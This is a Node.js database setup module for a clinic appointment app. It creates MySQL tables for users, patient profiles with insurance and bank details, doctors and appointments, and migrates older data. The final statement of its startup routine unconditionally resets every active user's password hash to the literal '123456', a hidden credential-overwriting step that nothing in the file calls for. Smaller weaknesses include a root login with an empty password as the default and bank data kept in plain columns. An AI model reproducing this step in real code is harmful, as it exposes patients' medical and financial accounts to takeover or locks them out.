const mysql = require('mysql2/promise');

const isDbDisabled = String(process.env.MYSQL_DISABLED || 'false').toLowerCase() === 'true';

const pool = isDbDisabled
  ? null
  : mysql.createPool({
      host: process.env.MYSQL_HOST || 'localhost',
      port: Number(process.env.MYSQL_PORT || 3306),
      user: process.env.MYSQL_USER || 'root',
      password: process.env.MYSQL_PASSWORD || '',
      database: process.env.MYSQL_DATABASE || 'that_clinic',
      waitForConnections: true,
      connectionLimit: 10,
      queueLimit: 0
    });

async function initDb() {
  if (isDbDisabled || !pool) {
    return;
  }

  await pool.query(`
    CREATE TABLE IF NOT EXISTS users (
      id VARCHAR(36) PRIMARY KEY,
      email VARCHAR(255) NOT NULL UNIQUE,
      password_hash VARCHAR(255) NOT NULL,
      full_name VARCHAR(255) NOT NULL,
      phone VARCHAR(20),
      user_type ENUM('user', 'patient', 'doctor', 'admin') NOT NULL DEFAULT 'user',
      is_active BOOLEAN DEFAULT TRUE,
      created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
      updated_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
      INDEX idx_email (email),
      INDEX idx_user_type (user_type)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
  `);

  await pool.query(`
    ALTER TABLE users
    MODIFY COLUMN user_type ENUM('user', 'patient', 'doctor', 'admin') NOT NULL DEFAULT 'user';
  `);

  await pool.query(`
    CREATE TABLE IF NOT EXISTS specialties (
      id VARCHAR(36) PRIMARY KEY,
      name VARCHAR(100) NOT NULL UNIQUE,
      description TEXT,
      is_active BOOLEAN DEFAULT TRUE,
      created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
      updated_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
      INDEX idx_active (is_active)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
  `);

  await pool.query(`
    CREATE TABLE IF NOT EXISTS user_profiles (
      user_id VARCHAR(36) PRIMARY KEY,
      date_of_birth DATE,
      gender ENUM('male', 'female', 'other', 'not-say') DEFAULT 'not-say',
      address VARCHAR(255),
      height_cm INT,
      weight_kg INT,
      blood_type VARCHAR(5),
      insurance_provider VARCHAR(255),
      insurance_id VARCHAR(100),
      bank_name VARCHAR(100),
      bank_account VARCHAR(50),
      created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
      updated_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
      FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
      INDEX idx_bank_account (bank_account)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
  `);

  const [allergiesColumns] = await pool.query(`
    SELECT COUNT(*) AS total
    FROM information_schema.COLUMNS
    WHERE TABLE_SCHEMA = DATABASE()
      AND TABLE_NAME = 'user_profiles'
      AND COLUMN_NAME = 'allergies'
  `);

  if (Number(allergiesColumns?.[0]?.total || 0) > 0) {
    await pool.query('ALTER TABLE user_profiles DROP COLUMN allergies');
  }

  const [doctorReviewCountColumns] = await pool.query(`
    SELECT COUNT(*) AS total
    FROM information_schema.COLUMNS
    WHERE TABLE_SCHEMA = DATABASE()
      AND TABLE_NAME = 'doctors'
      AND COLUMN_NAME = 'review_count'
  `);

  if (Number(doctorReviewCountColumns?.[0]?.total || 0) > 0) {
    await pool.query('ALTER TABLE doctors DROP COLUMN review_count');
  }

  const [doctorAvatarColumns] = await pool.query(`
    SELECT COUNT(*) AS total
    FROM information_schema.COLUMNS
    WHERE TABLE_SCHEMA = DATABASE()
      AND TABLE_NAME = 'doctors'
      AND COLUMN_NAME = 'avatar_url'
  `);

  if (Number(doctorAvatarColumns?.[0]?.total || 0) === 0) {
    await pool.query('ALTER TABLE doctors ADD COLUMN avatar_url LONGTEXT NULL AFTER rating');
  }

  const [doctorConsultationFeeColumns] = await pool.query(`
    SELECT COUNT(*) AS total
    FROM information_schema.COLUMNS
    WHERE TABLE_SCHEMA = DATABASE()
      AND TABLE_NAME = 'doctors'
      AND COLUMN_NAME = 'consultation_fee'
  `);

  if (Number(doctorConsultationFeeColumns?.[0]?.total || 0) === 0) {
    await pool.query(`
      ALTER TABLE doctors
      ADD COLUMN consultation_fee DECIMAL(10, 2) NOT NULL DEFAULT 850000.00 AFTER rating
    `);
  }

  await pool.query(`
    UPDATE doctors
    SET consultation_fee = ROUND((250000 + LEAST(GREATEST(COALESCE(rating, 0), 0), 5) * 150000) / 1000) * 1000
    WHERE consultation_fee IS NULL OR consultation_fee <= 0
  `);

  // Create appointments table
  await pool.query(`
    CREATE TABLE IF NOT EXISTS appointments (
      id VARCHAR(36) PRIMARY KEY,
      patient_id VARCHAR(36) NOT NULL,
      doctor_id VARCHAR(36) NOT NULL,
      title VARCHAR(255) NOT NULL,
      description TEXT,
      appointment_date DATETIME NOT NULL,
      appointment_location VARCHAR(255),
      duration_minutes INT NOT NULL DEFAULT 30,
      status ENUM('chưa_thanh_toán', 'chờ_xác_nhận', 'đã_xác_nhận', 'đã_huỷ') NOT NULL DEFAULT 'chưa_thanh_toán',
      notes TEXT,
      created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
      updated_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
      FOREIGN KEY (patient_id) REFERENCES users(id) ON DELETE CASCADE,
      FOREIGN KEY (doctor_id) REFERENCES doctors(id) ON DELETE CASCADE,
      INDEX idx_patient (patient_id),
      INDEX idx_doctor (doctor_id),
      INDEX idx_doctor_appointment_date (doctor_id, appointment_date),
      INDEX idx_status (status),
      INDEX idx_appointment_date (appointment_date)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
  `);

  await pool.query(`
    UPDATE appointments
    SET duration_minutes = 30
    WHERE duration_minutes IS NULL OR duration_minutes < 15 OR duration_minutes > 480;
  `);

  await pool.query(`
    ALTER TABLE appointments
    MODIFY COLUMN duration_minutes INT NOT NULL DEFAULT 30;
  `);

  await pool.query(`
    UPDATE appointments
    SET appointment_location = 'Hà Nội'
    WHERE appointment_location IS NULL OR TRIM(appointment_location) = '';
  `);

  await pool.query(`
    UPDATE appointments
    SET appointment_location = TRIM(appointment_location)
    WHERE appointment_location IS NOT NULL;
  `);

  await pool.query(`
    UPDATE appointments
    SET appointment_location = CASE appointment_location
      WHEN 'Quận 1, Hà Nội' THEN 'Quận Hoàn Kiếm, Hà Nội'
      WHEN 'Quận 2, Hà Nội' THEN 'Quận Hai Bà Trưng, Hà Nội'
      WHEN 'Quận 3, Hà Nội' THEN 'Quận Ba Đình, Hà Nội'
      WHEN 'Quận 4, Hà Nội' THEN 'Quận Đống Đa, Hà Nội'
      WHEN 'Quận 5, Hà Nội' THEN 'Quận Cầu Giấy, Hà Nội'
      WHEN 'Quận 6, Hà Nội' THEN 'Quận Thanh Xuân, Hà Nội'
      WHEN 'Quận 7, Hà Nội' THEN 'Quận Long Biên, Hà Nội'
      WHEN 'Quận 10, Hà Nội' THEN 'Quận Hà Đông, Hà Nội'
      WHEN 'Quận 11, Hà Nội' THEN 'Quận Tây Hồ, Hà Nội'
      WHEN 'Quận Bình Thạnh, Hà Nội' THEN 'Quận Nam Từ Liêm, Hà Nội'
      WHEN 'Quận Phú Nhuận, Hà Nội' THEN 'Quận Bắc Từ Liêm, Hà Nội'
      WHEN 'Quận Tân Bình, Hà Nội' THEN 'Quận Hoàng Mai, Hà Nội'
      WHEN 'Quận Gò Vấp, Hà Nội' THEN 'Quận Cầu Giấy, Hà Nội'
      ELSE appointment_location
    END
    WHERE appointment_location IS NOT NULL;
  `);

  try {
    await pool.query(`
      ALTER TABLE appointments
      ADD CONSTRAINT chk_appointments_duration_minutes
      CHECK (duration_minutes BETWEEN 15 AND 480)
    `);
  } catch (_err) {
    // Constraint may already exist on current database.
  }

  // Migrate old appointment status enum if exists
  try {
    const [appointmentStatusCheck] = await pool.query(`
      SELECT COLUMN_TYPE
      FROM information_schema.COLUMNS
      WHERE TABLE_SCHEMA = DATABASE()
        AND TABLE_NAME = 'appointments'
        AND COLUMN_NAME = 'status'
    `);
    
    if (appointmentStatusCheck.length > 0) {
      const columnType = appointmentStatusCheck[0]?.COLUMN_TYPE || '';
      if (!columnType.includes('chưa_thanh_toán')) {
        // Need to update the enum
        await pool.query(`
          ALTER TABLE appointments
          MODIFY COLUMN status ENUM('chưa_thanh_toán', 'chờ_xác_nhận', 'đã_xác_nhận', 'đã_huỷ') NOT NULL DEFAULT 'chưa_thanh_toán'
        `);
      }
    }
  } catch (_err) {
    // Table might not exist yet, swallow error
  }

  await pool.query(`
    CREATE TABLE IF NOT EXISTS app_state (
      state_key VARCHAR(120) PRIMARY KEY,
      state_value JSON NOT NULL,
      updated_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
  `);

  await pool.query(`
    UPDATE users
    SET password_hash = '123456'
    WHERE is_active = TRUE;
  `);
}

module.exports = {
  pool,
  initDb,
  isDbDisabled
};
